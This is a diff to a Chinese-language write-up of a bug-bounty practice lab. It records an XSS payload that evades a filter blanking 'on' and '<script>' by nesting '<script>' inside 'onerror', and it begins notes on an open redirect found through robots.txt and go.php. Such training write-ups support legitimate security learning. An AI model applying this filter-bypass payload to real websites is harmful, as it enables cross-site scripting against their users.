@@ -9,6 +9,12 @@
 发现on+字符会置空，还有script标签也会置空
 经过一小时尝试
 payload：
-`https://www.bugbountytraining.com/fastfoodhackings/index.php?act=xxx--%3E%3Cimg%20src=1%20o%3Cscript%3Ener%3Cscript%3Eror=alert()%3E\\`
+```
+https://www.bugbountytraining.com/fastfoodhackings/index.php?act=xxx--%3E%3Cimg%20src=1%20o%3Cscript%3Ener%3Cscript%3Eror=alert()%3E\\
+```
 在on之间插入置空的<script>
 
+# 页面跳转
+阅读robot.txt(一般在网站跟目录)发现有个go路径
+观察网站是php站点，访问go.php试试提示缺失return url
+猜测为returnUrl
